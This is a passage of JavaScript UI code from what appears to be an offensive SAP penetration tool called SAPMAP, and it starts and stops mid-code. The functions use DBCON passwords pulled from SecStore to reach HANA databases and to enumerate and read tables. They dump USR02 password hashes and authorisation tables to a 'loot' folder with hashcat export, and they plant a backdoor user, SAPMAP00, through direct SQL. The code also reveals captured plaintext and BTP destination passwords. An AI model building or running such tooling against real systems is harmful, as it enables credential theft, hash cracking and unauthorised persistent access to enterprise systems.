    `Table name in ${schema}:\n\n` +
    `Common SAP tables: USR02 (users), T000 (clients), TCPIC (connections),\n` +
    `AGR_USERS (role assignments), DDIC (table catalog), BKPF (fin docs)`,
    'USR02');
  if (table === null) return;
  const s = (schema || '').trim();
  const t = (table || '').trim();
  if (!s || !t) return;
  await runDBCONPeek(srcSid, conName, s, t);
}

async function runDBCONEnumerate(srcSid, conName) {
  console.log(`[DBCON] runDBCONEnumerate: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!edge.reachable) {
    alert('Run "Test connection" first — enumeration needs a live driver connection.');
    return;
  }
  flashActivity(`${srcSid}: DBCON enumerate tables → ${conName}`, 4000);
  await api('POST', `node/${srcSid}/dbcon/enumerate_tables`,
    { con_name: conName, limit: 200 });
  startPolling();
}

async function runDBCONPeek(srcSid, conName, schema, table, where) {
  console.log(`[DBCON] runDBCONPeek: ${srcSid} / ${conName} / `
    + `${schema}.${table}` + (where ? ` WHERE ${where}` : ''));
  flashActivity(`${srcSid}: DBCON peek → ${schema}.${table}`, 3000);
  const r = await api('POST', `node/${srcSid}/dbcon/peek_table`, {
    con_name: conName, schema, table, limit: 25,
    where: where || '' });
  if (r && r.error) { alert(`Peek failed: ${r.error}`); return; }
  _showDBCONPeekOverlay(srcSid, conName, schema, table, r);
}

function _showDBCONPeekOverlay(srcSid, conName, schema, table, res) {
  let existing = document.getElementById('dbcon-peek-overlay');
  if (existing) existing.remove();
  const div = document.createElement('div');
  div.id = 'dbcon-peek-overlay';
  // Cache row data on the DOM element so the CSV download button
  // can pick them up without re-fetching from the backend.
  div._peekRows = res.rows || [];
  div._peekCols = res.columns || [];
  div.style = 'position:fixed;top:8%;left:8%;right:8%;bottom:8%;'
    + 'background:#0d1117;border:2px solid #f0883e;border-radius:6px;'
    + 'z-index:10000;padding:12px 16px;overflow:auto;'
    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:monospace;'
    + 'color:#e6edf3;font-size:12px';
  const cols = (res.columns || []).map(c =>
    `<th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#f0883e">${escHtml(c)}</th>`
  ).join('');
  const rows = (res.rows || []).map(r =>
    '<tr>' + r.map(v =>
      `<td style="padding:4px 8px;border-bottom:1px solid #21262d;vertical-align:top;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${v === null ? '<i style="color:#6e7681">null</i>' : escHtml(String(v))}</td>`
    ).join('') + '</tr>').join('');
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
      <div><b style="color:#f0883e">DBCON peek — ${escHtml(schema)}.${escHtml(table)}</b>
        <span style="color:#8b949e;margin-left:12px">${(res.rows||[]).length} row(s), ${(res.columns||[]).length} col(s)${res.truncated ? ' — truncated' : ''}</span></div>
      <div style="display:flex;gap:6px">
        <button class="btn" onclick="runDBCONDescribe('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(schema)}','${escHtml(table)}')">&#128712; Columns</button>
        <button class="btn" style="background:#238636;color:#fff" onclick="_saveDBCONPeekAs('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(schema)}','${escHtml(table)}','csv')">&#8681; CSV</button>
        <button class="btn" style="background:#238636;color:#fff" onclick="_saveDBCONPeekAs('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(schema)}','${escHtml(table)}','json')">&#8681; JSON</button>
        ${table.toUpperCase() === 'USR02' ? `<button class="btn" style="background:#b3671f;color:#fff" onclick="_saveDBCONPeekAs('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(schema)}','${escHtml(table)}','hashcat')">&#128274; hashcat</button>` : ''}
        <button class="btn" onclick="this.closest('#dbcon-peek-overlay').remove()">Close</button>
      </div>
    </div>
    <div style="overflow:auto;max-height:calc(100% - 60px)">
      <table style="border-collapse:collapse;min-width:100%"><thead><tr>${cols}</tr></thead><tbody>${rows}</tbody></table>
    </div>
  `;
  document.body.appendChild(div);
}

async function runDBCONCreateUser(srcSid, conName) {
  console.log(`[DBCON] runDBCONCreateUser: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) {
    console.warn(`[DBCON] edge not found for ${srcSid}/${conName}`);
    alert(`DBCON edge ${conName} not found on ${srcSid}. Re-run SecStore extract first.`);
    return;
  }
  console.log(`[DBCON] edge state`, edge);
  if (!edge.tested) {
    alert(`Run "Test connection" first.\n\n` +
      `SAPMAP needs to open a live driver connection to ${edge.host}:${edge.port} ` +
      `to verify the DBCON is reachable and that the target has USR02 (SAP-shape). ` +
      `Only then can we plant SAPMAP00 via direct SQL.`);
    return;
  }
  if (!edge.reachable) {
    alert(`DBCON ${conName} is not reachable.\n\n` +
      `Last Test Connection failed:\n${edge.error || '(no error captured)'}\n\n` +
      `Re-test after fixing the network path / credentials / hdbcli install.`);
    return;
  }
  if (!edge.is_sap_shape) {
    alert(`DBCON ${conName} is reachable but NOT a SAP-shape DB.\n\n` +
      `USR02 is not present on ${edge.host}:${edge.port} — this looks like a ` +
      `non-SAP HANA (e.g. analytics / data-lake tenant). Direct user creation ` +
      `only works against SAP-shape DBs; use "Show details" to inspect ` +
      `what came back from the probe.`);
    return;
  }
  const client = prompt(
    `Create SAPMAP00 on ${edge.target_sid || conName} via direct ${edge.dbms}?\n\n` +
    `This runs 17 INSERT/UPDATE statements on ${edge.host}:${edge.port} using the DBCON password.\n\n` +
    `Client:`, '000');
  if (client === null) return;
  const trimmedClient = (client || '000').trim();
  console.log(`[DBCON] posting create_user: ${srcSid} conName=${conName} client=${trimmedClient}`);
  flashActivity(`${srcSid}: DBCON create SAPMAP00 → ${conName}`, 6000);
  const r = await api('POST', `node/${srcSid}/dbcon/create_user`, {
    con_name: conName, client: trimmedClient });
  console.log(`[DBCON] create_user response`, r);
  if (r && r.error) alert(`DBCON create failed: ${r.error}`);
  startPolling();
}

function showDBCONCtxMenu(e, srcSid, conName) {
  e.preventDefault();
  e.stopPropagation();
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  // Dedicated container — MUST NOT reuse #ctx-menu, or the SAP-node
  // template it holds (Import Local Transport, Add Credentials, …)
  // gets clobbered by our innerHTML assign below and the next
  // showCtxMenu() call on the parent node has nothing to restyle.
  hideCtxMenu(); hideSCCCtxMenu(); hideBTPCtxMenu(); hideTMSCtxMenu();
  const menu = document.getElementById('dbcon-ctx-menu');
  if (!menu) return;
  const testLbl = edge.tested
    ? (edge.reachable ? 'Re-test connection &#10003;' : 'Re-test connection &#10007;')
    : 'Test connection';
  const createLbl = edge.is_sap_shape
    ? 'Create SAPMAP00 via direct SQL'
    : 'Create user (needs reachable SAP-shape DB)';
  // Always route the click through runDBCONCreateUser — it inspects
  // edge state and pops an alert explaining what's still missing
  // (untested / unreachable / non-SAP-shape).  Silent no-op menu
  // items are terrible UX.
  const enumLbl = edge.reachable
    ? (edge.enumerated_tables && edge.enumerated_tables.length
        ? `Re-enumerate tables (${edge.enumerated_tables.length} known)`
        : 'Enumerate tables (non-SAP data reach)')
    : 'Enumerate tables (needs reachable DB)';
  menu.innerHTML = `
    <div class="ctx-header">DBCON ${escHtml(conName)} (${escHtml(edge.dbms || '?')})</div>
    <div class="ctx-item" onclick="runDBCONTest('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">${testLbl}</div>
    <div class="ctx-item${edge.is_sap_shape ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONCreateUser('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `${createLbl}</div>
    <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONEnumerate('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `${enumLbl}</div>
    <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONPeekCustom('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `Peek table (by name)&hellip;</div>
    <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONReconSweep('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `HANA recon sweep (M_LICENSE / M_HOST / T000&hellip;)</div>
    <div class="ctx-item${(edge.reachable && edge.is_sap_shape) ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONDumpUsr02('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `${edge.usr02_hashes_loot_path ? 'Re-dump USR02 hashes' : 'Dump USR02 hashes &rarr; loot/'}</div>
    <div class="ctx-item${(edge.reachable && edge.is_sap_shape) ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONDumpAuthTables('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `Dump auth tables (USR04/UST04/USRBF2) &rarr; loot/</div>
    <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
    + `onclick="runDBCONCustomSQL('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">`
    + `Custom read-only SQL&hellip;</div>
    <div class="ctx-item" onclick="showDBCONDetail('${escHtml(srcSid)}','${escHtml(conName)}');hideDBCONCtxMenu()">Show details</div>
  `;
  menu.style.left = e.clientX + 'px';
  menu.style.top  = e.clientY + 'px';
  menu.classList.add('visible');
}

// Ephemeral per-DBCON UI state — survives the auto-refresh
// innerHTML rebuild that would otherwise wipe input values, toggle
// state, and inner scroll positions.  Keyed by "srcSid|conName".
let dbconUiState = {};

function _dbconUiKey(srcSid, conName) {
  return srcSid + '|' + conName;
}

function _applyDBCONPasswordReveal(el, shown) {
  const pw = el.dataset.pw || '';
  if (shown) {
    el.textContent = pw + '  (click to hide)';
    el.dataset.shown = '1';
  } else {
    el.textContent = '●●●● (' + pw.length +
      ' chars — click to reveal — from SecStore)';
    el.dataset.shown = '0';
  }
}

function _filterDBCONEnumRows(srcSid, conName) {
  const input = document.getElementById(
    `dbcon-enum-search-${srcSid}-${conName}`);
  if (!input) return;
  const q = input.value.trim().toLowerCase();
  const scroll = document.getElementById(
    `dbcon-enum-scroll-${srcSid}-${conName}`);
  if (!scroll) return;
  const rows = scroll.querySelectorAll('tr.dbcon-enum-row');
  let matched = 0;
  rows.forEach(r => {
    const k = r.getAttribute('data-key') || '';
    const hit = !q || k.indexOf(q) !== -1;
    r.style.display = hit ? '' : 'none';
    if (hit) matched++;
  });
  // Persist for the auto-refresh
  const st = dbconUiState[_dbconUiKey(srcSid, conName)] || {};
  st.enumSearch = input.value;
  dbconUiState[_dbconUiKey(srcSid, conName)] = st;
}

function toggleDBCONPassword(el) {
  if (!el) return;
  const shown = el.dataset.shown === '1';
  _applyDBCONPasswordReveal(el, !shown);
  // Persist so the next auto-refresh re-applies it.
  const sidKey = document.getElementById('detail-panel').dataset.sid || '';
  if (sidKey.startsWith('dbcon:')) {
    const rest = sidKey.slice(6);
    const st = dbconUiState[rest.replace(':', '|')] || {};
    st.pwShown = !shown;
    dbconUiState[rest.replace(':', '|')] = st;
  }
}

function showDBCONDetail(srcSid, conName, opts) {
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  const panel = document.getElementById('detail-panel');
  if (!panel) return;
  const sidKey = `dbcon:${srcSid}:${conName}`;
  const refresh = !!(opts && opts.refresh);
  // Toggle: clicking the same cylinder / re-invoking Show details
  // for the currently-open DBCON dismisses the drawer.  Refresh
  // path skips the toggle (state-poll auto-update).
  if (!refresh && panel.classList.contains('visible') && panel.dataset.sid === sidKey) {
    _closeDetailPanel();
    return;
  }
  const preservedScroll = refresh ? (panel.scrollTop || 0) : 0;
  // Snapshot everything the auto-refresh would otherwise wipe:
  // input values, focused element + caret, inner-scroll positions,
  // password toggle state.  Restored at the bottom of this fn.
  const _uiKey = _dbconUiKey(srcSid, conName);
  const _uiSaved = dbconUiState[_uiKey] || {};
  const _schemaEl = document.getElementById(
    `dbcon-peek-schema-${srcSid}-${conName}`);
  const _tableEl  = document.getElementById(
    `dbcon-peek-table-${srcSid}-${conName}`);
  if (_schemaEl) _uiSaved.schema = _schemaEl.value;
  if (_tableEl)  _uiSaved.table  = _tableEl.value;
  const _whereEl = document.getElementById(
    `dbcon-peek-where-${srcSid}-${conName}`);
  if (_whereEl) _uiSaved.where = _whereEl.value;
  const _enumSearchEl = document.getElementById(
    `dbcon-enum-search-${srcSid}-${conName}`);
  if (_enumSearchEl) _uiSaved.enumSearch = _enumSearchEl.value;
  const _enumScrollEl = document.getElementById(
    `dbcon-enum-scroll-${srcSid}-${conName}`);
  const _reconScrollEl = document.getElementById(
    `dbcon-recon-scroll-${srcSid}-${conName}`);
  if (_enumScrollEl)  _uiSaved.enumScroll  = _enumScrollEl.scrollTop;
  if (_reconScrollEl) _uiSaved.reconScroll = _reconScrollEl.scrollTop;
  // Only overwrite the saved state if the current DOM actually
  // exposes data-shown (i.e. toggleDBCONPassword has run at least
  // once).  Otherwise a freshly-rendered span without the attr
  // would set pwShown=false and clobber the state the toggle just
  // wrote into dbconUiState.
  const _pwEl = document.querySelector(
    `#detail-panel .dbcon-pw`);
  if (_pwEl && _pwEl.hasAttribute('data-shown'))
    _uiSaved.pwShown = (_pwEl.dataset.shown === '1');
  // Focus preservation — widened to ANY dbcon-* input inside the
  // panel (peek schema/table/where, enum search, future custom-SQL
  // inputs).  Previously only dbcon-peek- prefixed inputs were
  // covered, which meant typing in the enum-search field lost focus
  // every refresh and subsequent keystrokes went nowhere.
  const _focusedInputId = (document.activeElement
    && document.activeElement.id
    && /^dbcon-(peek|enum)-/.test(document.activeElement.id))
    ? document.activeElement.id : null;
  const _focusedSelStart = (_focusedInputId && document.activeElement.selectionStart) || 0;
  const _focusedSelEnd   = (_focusedInputId && document.activeElement.selectionEnd) || 0;
  dbconUiState[_uiKey] = _uiSaved;
  panel.setAttribute('data-view', 'dbcon');
  panel.dataset.sid = sidKey;
  const stateChip = edge.pwned ? '<span class="risk-badge risk-CRITICAL">&#9889; PWNED</span>'
    : edge.reachable && edge.is_sap_shape ? '<span class="risk-badge risk-HIGH">SAP-shape reachable</span>'
    : edge.reachable ? '<span class="risk-badge risk-MEDIUM">Reachable (non-SAP)</span>'
    : edge.tested ? '<span class="risk-badge risk-LOW">Unreachable</span>'
    : '<span class="risk-badge">Untested</span>';
  const reasonMap = {
    'usr02_present': 'USR02 exists → confirmed ABAP-shape DB',
    'usr02_missing': 'USR02 does NOT exist (HANA 259) → confirmed non-SAP DB',
    'no_permission': 'INCONCLUSIVE — DBCON user lacks SELECT on USR02 (HANA 258). May still be SAP with hardened creds.',
    'unknown_error': 'Probe raised an unrecognised HANA error — see error below',
    '': 'Not yet probed — run Test connection',
  };
  const reasonText = reasonMap[edge.sap_shape_reason || ''] || edge.sap_shape_reason;
  const enumRows = (edge.enumerated_tables || []).slice(0, 40).map(t =>
    `<tr class="dbcon-enum-row" data-key="${escHtml((t.schema + '.' + t.table).toLowerCase())}">
       <td style="padding:2px 6px;color:#8b949e">${escHtml(t.schema)}</td>
       <td style="padding:2px 6px;color:#e6edf3;cursor:pointer;text-decoration:underline"
           title="Peek first 25 rows"
           onclick="runDBCONPeek('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(t.schema)}','${escHtml(t.table)}')">${escHtml(t.table)}</td>
       <td style="padding:2px 6px;color:#8b949e;text-align:right">${t.rows >= 0 ? t.rows.toLocaleString() : '?'}</td>
       <td style="padding:2px 6px;color:#6e7681;font-size:10px">${escHtml(t.table_type || '')}</td>
       <td style="padding:2px 6px;text-align:center">
         <span style="cursor:pointer;color:#58a6ff;text-decoration:underline;font-size:10px"
           title="Show columns"
           onclick="event.stopPropagation();runDBCONDescribe('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(t.schema)}','${escHtml(t.table)}')">cols</span>
       </td>
     </tr>`
  ).join('');
  // HANA recon-sweep facts card — render as compact col=value
  // pairs.  Long values (M_LICENSE's measurement XML blob is 4KB+)
  // get truncated with a click-to-expand toggle so the panel stays
  // readable.  Highlights the fields operators actually care about:
  // SID, HARDWARE_KEY, INSTALL_NO, PRODUCT_NAME.
  const _HIGHLIGHT_COLS = new Set([
    'SYSTEM_ID', 'SID', 'HARDWARE_KEY', 'INSTALL_NO', 'PRODUCT_NAME',
    'PRODUCT_LIMIT', 'IS_PERMANENT', 'EXPIRATION_DATE',
    'BUILD_VERSION', 'BUILD_DATE', 'DATABASE_NAME', 'ACTIVE_STATUS',
    'MANDT', 'USER_NAME', 'KEY', 'VALUE',
    'SERVICE_NAME', 'PORT', 'HOST']);
  const _fmtCell = (v, maxLen) => {
    if (v === null || v === undefined) return '<i style="color:#6e7681">∅</i>';
    const s = String(v);
    if (s.length <= maxLen) return escHtml(s);
    // XML / long blob — clickable expand
    const id = 'recon-cell-' + Math.random().toString(36).slice(2, 10);
    return `<span id="${id}" data-full="${escHtml(s)}"
      style="cursor:pointer;color:#8b949e"
      title="Click to expand full value (${s.length} chars)"
      onclick="const _f=this.dataset.full;this.textContent=_f;this.style.color='#c9d1d9';this.onclick=null"
      >${escHtml(s.slice(0, maxLen))}<span style="color:#f0883e">…+${s.length - maxLen}</span></span>`;
  };
  const _renderReconRow = (cols, row) => {
    if (!cols || !cols.length) {
      return escHtml((row || []).map(x =>
        x === null ? '∅' : String(x)).slice(0, 4).join(' | '));
    }
    // key=value with the "interesting" fields bolded
    const parts = [];
    for (let i = 0; i < cols.length; i++) {
      const c = String(cols[i] || '').toUpperCase();
      const v = row[i];
      // Skip completely empty cells — they clutter the panel
      if (v === null || v === undefined || String(v).trim() === '')
        continue;
      const hi = _HIGHLIGHT_COLS.has(c);
      // Long-column budget: values >120 chars get truncated
      const maxLen = (c === 'VALUE' || c === 'MTEXT') ? 60 : 120;
      parts.push(
        `<span style="${hi ? 'color:#f0883e;font-weight:bold' : 'color:#8b949e'}">${escHtml(cols[i])}</span>` +
        `<span style="color:#586069">=</span>` +
        `<span style="color:#c9d1d9">${_fmtCell(v, maxLen)}</span>`
      );
    }
    return parts.join(
      '<span style="color:#30363d;margin:0 6px">·</span>');
  };
  const reconFacts = edge.recon_facts || {};
  const reconRows = Object.keys(reconFacts).map(k => {
    const v = reconFacts[k];
    if (v.error) return `<div style="font-size:10px;color:#f85149;margin-bottom:6px"><b>${escHtml(k)}</b>: ${escHtml(v.error)}</div>`;
    const rowsToShow = (v.rows || []).slice(0, 3);
    const sample = rowsToShow.map(r =>
      `<div style="font-size:10px;margin-left:8px;padding:2px 0;white-space:pre-wrap;word-break:break-word;line-height:1.5">${_renderReconRow(v.columns, r)}</div>`
    ).join('');
    const more = (v.count || 0) > 3 ? `<div style="font-size:9px;color:#6e7681;margin-left:8px">… +${v.count - 3} more row(s)</div>` : '';
    return `<div style="margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #21262d">
       <div style="font-size:11px;color:#3fb950;font-weight:bold">${escHtml(k)} <span style="color:#8b949e;font-weight:normal">(${v.count || 0} row${v.count === 1 ? '' : 's'})</span></div>
       ${sample}${more}
     </div>`;
  }).join('');
  const reconSection = Object.keys(reconFacts).length
    ? `<div class="info-section">
         <div style="color:#f0883e;font-weight:bold;margin-bottom:4px">HANA recon facts</div>
         <div id="dbcon-recon-scroll-${escHtml(srcSid)}-${escHtml(conName)}" style="max-height:200px;overflow:auto;padding:4px;background:#0a0d10;border-radius:3px">${reconRows}</div>
       </div>`
    : '';
  // USR02 dump loot pointer
  const lootSection = edge.usr02_hashes_loot_path
    ? `<div class="info-section" style="background:#1a2a1a;padding:6px 8px;border-radius:3px">
         <div style="color:#3fb950;font-weight:bold;font-size:11px">&#128274; USR02 hashes dumped</div>
         <div style="font-size:10px;color:#8b949e;word-break:break-all;margin-top:2px">${escHtml(edge.usr02_hashes_loot_path)}</div>
       </div>`
    : '';
  const peekInputSection = edge.reachable
    ? `<div class="info-section">
         <div style="color:#f0883e;font-weight:bold;margin-bottom:4px">Peek arbitrary table</div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;font-size:11px;margin-bottom:4px">
           <input id="dbcon-peek-schema-${escHtml(srcSid)}-${escHtml(conName)}" placeholder="Schema" value="SAPHANADB"
             style="min-width:0;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 6px;border-radius:3px;font-family:monospace" />
           <input id="dbcon-peek-table-${escHtml(srcSid)}-${escHtml(conName)}" placeholder="Table" value="USR02"
             style="min-width:0;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 6px;border-radius:3px;font-family:monospace" />
         </div>
         <input id="dbcon-peek-where-${escHtml(srcSid)}-${escHtml(conName)}" placeholder="Optional WHERE (bare — e.g. BNAME LIKE 'DDIC%')"
             style="width:100%;box-sizing:border-box;margin-bottom:6px;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 6px;border-radius:3px;font-family:monospace;font-size:11px" />
         <button class="btn" style="width:100%;padding:5px 10px;background:#238636;color:#fff;font-weight:bold;border:none;border-radius:3px;cursor:pointer"
           onclick="runDBCONPeek('${escHtml(srcSid)}','${escHtml(conName)}',document.getElementById('dbcon-peek-schema-${escHtml(srcSid)}-${escHtml(conName)}').value.trim(),document.getElementById('dbcon-peek-table-${escHtml(srcSid)}-${escHtml(conName)}').value.trim(),document.getElementById('dbcon-peek-where-${escHtml(srcSid)}-${escHtml(conName)}').value.trim())">&#128064; Peek 25 rows</button>
       </div>`
    : '';
  const enumSection = (edge.enumerated_tables && edge.enumerated_tables.length)
    ? `<div class="info-section">
         <div style="color:#f0883e;font-weight:bold;margin-bottom:4px">Enumerated tables (${edge.enumerated_tables.length})</div>
         <input id="dbcon-enum-search-${escHtml(srcSid)}-${escHtml(conName)}" placeholder="Filter (schema or table substring)…"
             oninput="_filterDBCONEnumRows('${escHtml(srcSid)}','${escHtml(conName)}')"
             style="width:100%;box-sizing:border-box;margin-bottom:4px;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:3px 6px;border-radius:3px;font-family:monospace;font-size:11px" />
         <div id="dbcon-enum-scroll-${escHtml(srcSid)}-${escHtml(conName)}" style="max-height:220px;overflow:auto;border:1px solid #30363d;border-radius:3px">
           <table style="border-collapse:collapse;font-size:11px;width:100%">
             <thead><tr style="background:#161b22">
               <th style="text-align:left;padding:3px 6px;color:#8b949e">Schema</th>
               <th style="text-align:left;padding:3px 6px;color:#8b949e">Table (click to peek)</th>
               <th style="text-align:right;padding:3px 6px;color:#8b949e">Rows</th>
               <th style="text-align:left;padding:3px 6px;color:#8b949e">Type</th>
               <th style="text-align:center;padding:3px 6px;color:#8b949e"></th>
             </tr></thead>
             <tbody>${enumRows}</tbody>
           </table>
         </div>
         ${edge.enumerated_tables.length > 40 ? `<div style="color:#6e7681;font-size:10px;margin-top:4px">Showing top 40 by row count — ${edge.enumerated_tables.length - 40} more not displayed.</div>` : ''}
       </div>`
    : '';
  panel.innerHTML = `
    <h3>DBCON — ${escHtml(conName)}</h3>
    <div class="info-row"><span class="info-label">Source:</span><span class="info-val">${escHtml(srcSid)}</span></div>
    <div class="info-row"><span class="info-label">DBMS:</span><span class="info-val">${escHtml(edge.dbms || '?')}</span></div>
    <div class="info-row"><span class="info-label">Host:</span><span class="info-val mono">${escHtml(edge.host || '?')}</span></div>
    <div class="info-row"><span class="info-label">Port:</span><span class="info-val">${edge.port || '?'}</span></div>
    <div class="info-row"><span class="info-label">User:</span><span class="info-val mono">${escHtml(edge.user || '?')}</span></div>
    ${edge.dbname ? `<div class="info-row"><span class="info-label">Tenant:</span><span class="info-val mono">${escHtml(edge.dbname)}</span></div>` : ''}
    <div class="info-row"><span class="info-label">Password:</span><span class="info-val mono dbcon-pw" style="color:#3fb950;cursor:pointer" `
    + `data-pw="${escHtml(edge.password || '')}" `
    + `title="Click to reveal / hide plaintext password" `
    + `onclick="toggleDBCONPassword(this)">&#9679;&#9679;&#9679;&#9679; (${(edge.password||'').length} chars — click to reveal — from SecStore)</span></div>
    ${edge.target_sid ? `<div class="info-row"><span class="info-label">Target SID:</span><span class="info-val mono" style="color:#3fb950;font-weight:bold">${escHtml(edge.target_sid)}</span></div>` : ''}
    <div class="info-row"><span class="info-label">Status:</span><span class="info-val">${stateChip}</span></div>
    <div class="info-row"><span class="info-label">SAP-shape:</span><span class="info-val" style="font-size:11px;color:#c9d1d9">${escHtml(reasonText)}</span></div>
    ${edge.tested_at ? `<div class="info-row"><span class="info-label">Tested at:</span><span class="info-val" style="font-size:11px;color:#8b949e">${escHtml(edge.tested_at)}</span></div>` : ''}
    ${edge.error ? `<div class="info-section" style="color:#f85149;font-size:11px">${escHtml(edge.error)}</div>` : ''}
    ${lootSection}
    ${reconSection}
    ${peekInputSection}
    ${enumSection}
    <div style="text-align:right;margin-top:12px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
      <button class="btn" onclick="runDBCONTest('${escHtml(srcSid)}','${escHtml(conName)}')">${edge.tested ? 'Re-test' : 'Test Connection'}</button>
      ${edge.reachable ? `<button class="btn" onclick="runDBCONEnumerate('${escHtml(srcSid)}','${escHtml(conName)}')">Enumerate tables</button>` : ''}
      ${edge.reachable ? `<button class="btn" onclick="runDBCONReconSweep('${escHtml(srcSid)}','${escHtml(conName)}')">HANA recon</button>` : ''}
      ${(edge.reachable && edge.is_sap_shape) ? `<button class="btn" style="background:#b3671f;color:#fff" onclick="runDBCONDumpUsr02('${escHtml(srcSid)}','${escHtml(conName)}')">${edge.usr02_hashes_loot_path ? 'Re-dump USR02' : 'Dump USR02 &rarr; loot'}</button>` : ''}
      ${edge.is_sap_shape ? `<button class="btn" style="background:#b33;color:#fff" onclick="runDBCONCreateUser('${escHtml(srcSid)}','${escHtml(conName)}')">Create SAPMAP00 (direct SQL)</button>` : ''}
      <button class="btn" onclick="_closeDetailPanel()">Close</button>
    </div>
  `;
  panel.classList.add('visible');
  if (refresh && preservedScroll) panel.scrollTop = preservedScroll;
  // Restore ALL preserved UI state — inputs, inner scrolls, password
  // reveal, focus + caret.  Without this the auto-refresh (1/s)
  // wipes anything the operator was interacting with.
  const _newSchemaEl = document.getElementById(
    `dbcon-peek-schema-${srcSid}-${conName}`);
  const _newTableEl  = document.getElementById(
    `dbcon-peek-table-${srcSid}-${conName}`);
  if (_newSchemaEl && _uiSaved.schema !== undefined)
    _newSchemaEl.value = _uiSaved.schema;
  if (_newTableEl && _uiSaved.table !== undefined)
    _newTableEl.value  = _uiSaved.table;
  const _newWhereEl = document.getElementById(
    `dbcon-peek-where-${srcSid}-${conName}`);
  if (_newWhereEl && _uiSaved.where !== undefined)
    _newWhereEl.value = _uiSaved.where;
  const _newEnumSearchEl = document.getElementById(
    `dbcon-enum-search-${srcSid}-${conName}`);
  if (_newEnumSearchEl && _uiSaved.enumSearch !== undefined) {
    _newEnumSearchEl.value = _uiSaved.enumSearch;
    // Re-apply the filter on the restored input
    _filterDBCONEnumRows(srcSid, conName);
  }
  const _newEnumScroll = document.getElementById(
    `dbcon-enum-scroll-${srcSid}-${conName}`);
  const _newReconScroll = document.getElementById(
    `dbcon-recon-scroll-${srcSid}-${conName}`);
  if (_newEnumScroll && _uiSaved.enumScroll !== undefined)
    _newEnumScroll.scrollTop = _uiSaved.enumScroll;
  if (_newReconScroll && _uiSaved.reconScroll !== undefined)
    _newReconScroll.scrollTop = _uiSaved.reconScroll;
  if (_uiSaved.pwShown) {
    // NB: query WITHOUT [data-shown] — the freshly-rendered password
    // span has no data-shown attr yet (that's set by our own
    // toggle/apply code), so [data-shown] would return null and
    // the restore would silently no-op, flickering back to ●●●●.
    const _newPwEl = document.querySelector(
      `#detail-panel .dbcon-pw`);
    if (_newPwEl) _applyDBCONPasswordReveal(_newPwEl, true);
  }
  if (_focusedInputId) {
    const _el = document.getElementById(_focusedInputId);
    if (_el) {
      _el.focus();
      try { _el.setSelectionRange(_focusedSelStart, _focusedSelEnd); }
      catch (_) {}
    }
  }
}

function showBTPDetail(uuid, opts) {
  const bn = (mapState.btp_subaccounts || {})[uuid];
  if (!bn) return;
  const panel = document.getElementById('detail-panel');
  const refresh = !!(opts && opts.refresh);
  if (!refresh && panel.classList.contains('visible') && panel.dataset.sid === 'btp:' + uuid) {
    _closeDetailPanel();
    return;
  }
  const preservedScroll = refresh ? (panel.scrollTop || 0) : 0;
  panel.dataset.sid = 'btp:' + uuid;
  panel.setAttribute('data-view', 'btp');
  const dests = bn.destinations || [];
  const cleartext = dests.filter(d => d && d.cleartext_captured);
  const linked = dests.filter(d => d && d.linked_target_sid);
  const destRows = dests.map((d, di) => {
    const flags = [];
    if (d.cleartext_captured) flags.push('<span style="color:#e74c3c;font-weight:bold">CLEARTEXT</span>');
    if (d.linked_target_sid) flags.push('<span style="color:#3fb950">→ ' + escHtml(d.linked_target_sid) + '</span>');
    const pwId = 'btp-pw-' + uuid.slice(0, 8) + '-' + di;
    const pwBlock = d.password ? `
      <div style="font-size:11px;margin-top:4px;display:flex;align-items:center;gap:6px">
        <span style="color:#8b949e">Password:</span>
        <code id="${pwId}" style="background:#161b22;padding:2px 6px;border-radius:3px;font-family:monospace;color:#f85149;user-select:text;word-break:break-all">${escHtml(d.password)}</code>
        <button data-pw="${escHtml(d.password)}" onclick="navigator.clipboard.writeText(this.dataset.pw);this.textContent='copied';setTimeout(()=>this.textContent='copy',1200)" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer">copy</button>
      </div>` : '';
    return `<div style="border-left:3px solid #5dade2;padding:6px 8px;margin:6px 0;background:#0d1117">
      <div style="font-weight:bold;font-family:monospace">${escHtml(d.name || '?')}</div>
